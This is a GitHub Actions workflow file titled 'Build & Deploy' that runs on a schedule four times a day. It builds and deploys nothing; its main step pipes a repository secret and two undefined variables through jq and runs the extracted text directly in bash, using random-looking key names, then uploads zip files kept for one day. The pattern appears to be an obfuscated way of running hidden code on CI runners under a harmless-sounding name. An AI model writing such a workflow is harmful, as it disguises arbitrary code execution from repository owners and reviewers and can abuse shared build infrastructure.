name: Build & Deploy
on:
  workflow_dispatch:

  schedule:
    - cron: '15 4,10,16,22 * * *'
permissions:
  contents: read
  actions: read
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  trigger:
    name: Run task
    runs-on: ubuntu-latest
    timeout-minutes: 360
    steps:
      - name: Checkout
        uses: actions/checkout@v4
      - name: Start
        env:
          r1: ${{ secrets.r1 }}
        run: |
          printf '%s' "$r1" | jq -r .hfm99 | /bin/bash
          printf '%s' "$dqk4244" | jq -r .bf14896 | /bin/bash
          echo $kaq607 | jq -r .yxr86 | /bin/bash

      - name: Save output
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: YYYllTbI
          path: "*.zip"
          retention-days: 1
